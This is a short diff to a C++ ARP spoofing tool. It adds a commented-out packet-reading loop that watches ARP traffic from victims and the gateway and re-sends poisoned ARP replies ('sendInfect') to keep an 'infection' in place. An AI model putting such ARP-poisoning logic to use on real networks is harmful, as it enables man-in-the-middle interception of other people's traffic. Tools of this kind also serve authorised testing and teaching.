@@ -1,5 +1,44 @@
 #include "netinfo.h"
 #include "arpspoof.h"
+/*
+Packet::Result ArpSpoof::read(Packet* packet) {
+    while (true) {
+        if (state_ != Opened)
+            return Packet::Fail;
+
+        Packet::Result res = PcapDevice::read(packet);
+        if (res == Packet::Eof || res == Packet::Fail) return res;
+        if (res == Packet::None) continue;
+
+        EthHdr* ethHdr = packet->ethHdr_;
+        // attacker sending packet?
+        Mac smac = ethHdr->smac();
+        if (smac == myMac_) continue;
+        if (smac.isBroadcast() || smac.isMulticast()) continue;
+
+        uint16_t type = ethHdr->type();
+        if (type == EthHdr::Arp) {
+            ArpHdr* arpHdr = packet->arpHdr_;
+            {
+                std::lock_guard<std::mutex> lock(infectionList_.m_);
+                for (Flow& flow: infectionList_) {
+                    bool infect = false;
+                    if (arpHdr->sip() == flow.ip_ && arpHdr->smac() != flow.mac_ && arpHdr->tip() == gwIp_) { // sender > target ARP packet
+                        infect = true;
+                    } else
+                        if (arpHdr->sip() == gwIp_ && arpHdr->smac() != flow.mac_ && ethHdr->dmac() == Mac::broadcastMac()) { // target to any ARP packet
+                            infect = true;
+                        }
+                    if (infect)
+                        sendInfect(flow);
+                }
+            }
+            continue;
+        }
+    }
+    return Packet::Fail; // remove warning: non-void function does not return a value in all control paths
+}*/
+
 bool ArpSpoof::prepare()
 {
     bool res = PcapDevice::doOpen();
